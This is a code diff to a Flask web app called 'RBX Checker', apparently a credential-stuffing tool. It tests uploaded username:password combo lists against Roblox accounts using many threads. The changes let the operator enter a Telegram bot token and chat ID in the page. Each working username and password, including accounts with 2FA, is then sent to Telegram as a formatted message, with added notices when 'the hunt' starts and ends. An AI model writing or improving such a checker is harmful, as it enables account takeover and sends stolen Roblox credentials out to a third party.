@@ -12,15 +12,13 @@ app = Flask(__name__)
 app.config["SECRET_KEY"] = os.urandom(24).hex()
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")
 
-# الإعدادات (تقدر تغيرها)
-BOT_TOKEN = ""  # حط التوكن هنا
-CHAT_ID = ""    # حط الايدي هنا
-WORKERS = 20    # عدد الثريدات
-
 STATE = {
     "running": False,
     "stats": {"hits": 0, "bad": 0, "2fa": 0, "total": 0, "processed": 0},
     "logs": [],
+    "bot_token": "",
+    "chat_id": "",
+    "workers": 20
 }
 LOCK = threading.Lock()
 STOP_FLAG = threading.Event()
@@ -34,12 +32,18 @@ def log(line: str):
     socketio.emit("log", {"line": entry})
     socketio.emit("stats", STATE["stats"])
 
-def send_telegram(username, password, profile):
-    if not BOT_TOKEN or not CHAT_ID:
+def send_telegram(text):
+    token, chat = STATE["bot_token"], STATE["chat_id"]
+    if not token or not chat:
         return
     try:
-        msg = f"✅ ROBLOX HIT!\n👤 User: {username}\n🔑 Pass: {password}\n🔗 {profile}"
-        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": msg}, timeout=5)
+        url = f"https://api.telegram.org/bot{token}/sendMessage"
+        requests.post(url, json={
+            "chat_id": chat, 
+            "text": text, 
+            "parse_mode": "HTML",
+            "disable_web_page_preview": True
+        }, timeout=5)
     except Exception:
         pass
 
@@ -96,16 +100,25 @@ def worker(combo_queue):
                 STATE["stats"]["bad"] += 1
                 
         if result:
-            status = "2FA" if result.get("2fa") else "HIT"
+            status = "2FA (Valid)" if result.get("2fa") else "HIT (Working)"
             log(f"{status} → {username}:{password}")
-            send_telegram(result["username"], result["password"], result["profile"])
+            
+            # تصميم رسالة البوت بشكل جميل
+            msg = f"""<b>✅ ROBLOX {status}!</b>
+
+👤 <b>User:</b> <code>{result['username']}</code>
+🔑 <b>Pass:</b> <code>{result['password']}</code>
+🔗 <a href="{result['profile']}">View Profile</a>
+
+<i>Sent by ALPHA XK Checker</i>"""
+            send_telegram(msg)
         else:
             log(f"BAD → {username}")
             
         socketio.emit("stats", STATE["stats"])
         combo_queue.task_done()
 
-def run_checker(combos):
+def run_checker(combos, workers):
     with LOCK:
         STATE["stats"] = {"hits": 0, "bad": 0, "2fa": 0, "total": len(combos), "processed": 0}
     STATE["running"] = True
@@ -115,9 +128,12 @@ def run_checker(combos):
     for c in combos:
         combo_q.put(c)
         
+    # إشعار بدء التشغيل في البوت
+    send_telegram(f"<b>🚀 بدأ الصيد!</b>\n\n📁 <b>عدد الحسابات:</b> <code>{len(combos)}</code>\n⚙️ <b>الثريدات (Workers):</b> <code>{workers}</code>")
+    
     log(f"بدأ الفحص لـ {len(combos)} حساب...")
     threads = []
-    for _ in range(min(WORKERS, max(1, len(combos)))):
+    for _ in range(min(workers, max(1, len(combos)))):
         t = threading.Thread(target=worker, args=(combo_q,), daemon=True)
         t.start()
         threads.append(t)
@@ -127,6 +143,9 @@ def run_checker(combos):
         
     STATE["running"] = False
     log(f"خلصنا! صيد: {STATE['stats']['hits']} | 2FA: {STATE['stats']['2fa']} | خربان: {STATE['stats']['bad']}")
+    
+    # إشعار انتهاء التشغيل
+    send_telegram(f"<b>🏁 انتهى الصيد!</b>\n\n✅ <b>Hits:</b> {STATE['stats']['hits']}\n🔒 <b>2FA:</b> {STATE['stats']['2fa']}\n❌ <b>Bad:</b> {STATE['stats']['bad']}")
 
 INDEX_HTML = r"""<!doctype html>
 <html lang="ar" dir="rtl">
@@ -136,50 +155,68 @@ INDEX_HTML = r"""<!doctype html>
 <title>RBX Checker</title>
 <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
 <style>
-  :root { --bg:#0a0e0a; --fg:#39ff14; --dim:#1a3a1a; --err:#ff3b3b; }
+  :root { --bg:#0a0e0a; --fg:#39ff14; --dim:#1a3a1a; --panel:#0d140d; }
   * { box-sizing:border-box; }
   body { margin:0; background:var(--bg); color:var(--fg); font-family:"Courier New",monospace; }
   .wrap { max-width:800px; margin:0 auto; padding:20px; }
-  h1 { font-size:18px; text-align:center; margin-bottom:20px; }
+  h1 { font-size:20px; text-align:center; margin-bottom:20px; text-shadow: 0 0 10px var(--fg); }
   
-  .upload-box {
-    border: 2px dashed var(--fg); padding: 40px 20px; text-align: center;
-    border-radius: 8px; margin-bottom: 20px; cursor: pointer; transition: 0.3s;
-    display: block; width: 100%;
+  .settings { display:flex; gap:10px; margin-bottom:15px; flex-wrap:wrap; }
+  .settings input, .settings select {
+    background: var(--panel); border: 1px solid var(--dim); color: var(--fg);
+    padding: 10px; border-radius: 5px; font-family: inherit; flex: 1;
   }
-  .upload-box:hover { background: rgba(57, 255, 20, 0.1); }
+  .settings input:focus, .settings select:focus { outline: none; border-color: var(--fg); }
+
+  .upload-box {
+    border: 2px dashed var(--dim); padding: 30px 20px; text-align: center;
+    border-radius: 8px; margin-bottom: 20px; cursor: pointer; transition: 0.3s;
+    display: block; width: 100%; background: var(--panel);
+  }
+  .upload-box:hover { border-color: var(--fg); background: rgba(57, 255, 20, 0.05); }
   .upload-box input[type="file"] { display: none; }
-  .upload-box span { font-size: 16px; pointer-events: none; display: block; }
-  
-  .stats { display:grid; grid-template-columns:repeat(2,1fr); gap:10px; margin-bottom:20px; }
-  .stat { border:1px solid var(--dim); padding:10px; text-align:center; border-radius:5px; }
+  .upload-box span { font-size: 16px; pointer-events: none; display: block; color: #aaa; }
+  .upload-box:hover span { color: var(--fg); }
+
+  .stats { display:grid; grid-template-columns:repeat(4,1fr); gap:10px; margin-bottom:20px; }
+  .stat { border:1px solid var(--dim); padding:10px; text-align:center; border-radius:5px; background: var(--panel); }
   .stat b { display:block; font-size:22px; margin-top:5px; }
+  .stat.hits b { color: var(--fg); text-shadow: 0 0 5px var(--fg); }
+  .stat.bad b { color: #ff4444; }
+
   .term {
-    background:#000; border:1px solid var(--dim); padding:10px;
-    height:350px; overflow-y:auto; font-size:13px; line-height:1.5;
+    background:#000; border:1px solid var(--dim); padding:15px;
+    height:300px; overflow-y:auto; font-size:13px; line-height:1.6;
     white-space:pre-wrap; word-break:break-all; border-radius:5px;
   }
   .hit { color:var(--fg); font-weight:bold; }
-  .bad { color:#ff8888; }
+  .bad { color:#ff4444; opacity: 0.7; }
+  .sys { color:#00ffff; }
 </style>
 </head>
 <body>
 <div class="wrap">
   <h1>▶ RBX CHECKER</h1>
   
+  <div class="settings">
+    <input type="password" id="bot_token" placeholder="Bot Token (تيليجرام)">
+    <input type="text" id="chat_id" placeholder="Chat ID (المعرف)">
+    <input type="number" id="workers" value="20" min="1" max="100" style="max-width:80px;" title="عدد الثريدات">
+  </div>
+
   <label class="upload-box" id="drop-zone">
     <input type="file" id="file-input" accept=".txt">
-    <span id="upload-text">📁 اضغط هنا أو اسحب ملف الكومبو</span>
+    <span id="upload-text">📁 اضغط هنا لاختيار ملف الكومبو وبدء الصيد فوراً</span>
   </label>
 
   <div class="stats">
-    <div class="stat">الصيد (Hits) <b id="s-hits">0</b></div>
-    <div class="stat">2FA <b id="s-2fa">0</b></div>
-    <div class="stat">الخربان (Bad) <b id="s-bad">0</b></div>
-    <div class="stat">المعالج (Processed) <b id="s-proc">0</b></div>
+    <div class="stat">Total <b id="s-total">0</b></div>
+    <div class="stat">Processed <b id="s-proc">0</b></div>
+    <div class="stat hits">Hits <b id="s-hits">0</b></div>
+    <div class="stat bad">Bad <b id="s-bad">0</b></div>
   </div>
 
-  <div class="term" id="term">> بانتظار الملف...<br>> سيبدأ الفحص تلقائياً بمجرد رفع الملف.</div>
+  <div class="term" id="term">> بانتظار الملف...<br>> تأكد من وضع التوكن والايدي فوق قبل رفع الملف.</div>
 </div>
 
 <script>
@@ -200,23 +237,29 @@ fileInput.addEventListener("change", async (e) => {
   const file = e.target.files[0];
   if (!file) return;
   
-  uploadText.textContent = "⏳ جاري رفع الملف للسيرفر...";
-  append("", `> تم اختيار الملف: ${file.name} (${Math.round(file.size / 1024)} KB)`);
+  const token = document.getElementById("bot_token").value.trim();
+  const chat = document.getElementById("chat_id").value.trim();
+  const workers = parseInt(document.getElementById("workers").value) || 20;
   
-  // إرسال الملف كملف FormData للسيرفر عشان يقراه
+  if (!token || !chat) {
+    append("bad", "!! تنبيه: ما حطيت التوكن أو الايدي، البوت ما راح يرسل النتائج.");
+  }
+
+  uploadText.textContent = "⏳ جاري رفع الملف وبدء الصيد...";
+  append("sys", `> تم اختيار الملف: ${file.name} (${Math.round(file.size / 1024)} KB)`);
+  
   const formData = new FormData();
   formData.append("file", file);
+  formData.append("bot_token", token);
+  formData.append("chat_id", chat);
+  formData.append("workers", workers);
   
   try {
-    const r = await fetch("/api/upload", { 
-      method: "POST",
-      body: formData
-    });
-    
+    const r = await fetch("/api/upload", { method: "POST", body: formData });
     const j = await r.json();
     if (j.ok) {
-      uploadText.textContent = "✅ تم الرفع! جاري بدء الفحص...";
-      append("", `> السيرفر قرأ الملف بنجاح (${j.total} حساب).`);
+      uploadText.textContent = "✅ جاري الصيد الآن...";
+      append("sys", `> السيرفر قرأ الملف (${j.total} حساب) وبدأ الشغل.`);
     } else {
       append("bad", "!! خطأ: " + j.error);
       uploadText.textContent = "❌ فشل الرفع، جرب مرة ثانية";
@@ -229,18 +272,19 @@ fileInput.addEventListener("change", async (e) => {
 
 socket.on("log", d => {
   let cls = "";
-  if (d.line.includes("HIT")) cls = "hit";
+  if (d.line.includes("HIT") || d.line.includes("2FA")) cls = "hit";
   if (d.line.includes("BAD")) cls = "bad";
   append(cls, d.line);
 });
 
 socket.on("stats", s => {
-  document.getElementById("s-hits").textContent = s.hits;
-  document.getElementById("s-2fa").textContent = s["2fa"];
-  document.getElementById("s-bad").textContent = s.bad;
+  document.getElementById("s-total").textContent = s.total;
   document.getElementById("s-proc").textContent = s.processed;
+  document.getElementById("s-hits").textContent = s.hits + s["2fa"];
+  document.getElementById("s-bad").textContent = s.bad;
+  
   if (s.processed >= s.total && s.total > 0) {
-    uploadText.textContent = "✅ خلص الفحص! تقدر ترفع ملف جديد.";
+    uploadText.textContent = "✅ خلص الصيد! تقدر ترفع ملف جديد.";
   }
 });
 </script>
@@ -264,8 +308,12 @@ def api_upload():
     if file.filename == "":
         return jsonify({"ok": False, "error": "اسم الملف فاضي"}), 400
         
+    # استقبال الإعدادات من المتصفح
+    STATE["bot_token"] = request.form.get("bot_token", "")
+    STATE["chat_id"] = request.form.get("chat_id", "")
+    workers = int(request.form.get("workers", 20))
+        
     try:
-        # قراءة الملف من السيرفر مباشرة
         content = file.read().decode("utf-8", errors="ignore")
         combos = [line.strip() for line in content.splitlines() if ":" in line]
         
@@ -273,7 +321,7 @@ def api_upload():
             return jsonify({"ok": False, "error": "الملف فاضي أو مافيه صيغة صحيحة (user:pass)"}), 400
             
         # بدء الفحص في الخلفية
-        threading.Thread(target=run_checker, args=(combos,), daemon=True).start()
+        threading.Thread(target=run_checker, args=(combos, workers), daemon=True).start()
         return jsonify({"ok": True, "total": len(combos)})
         
     except Exception as e:
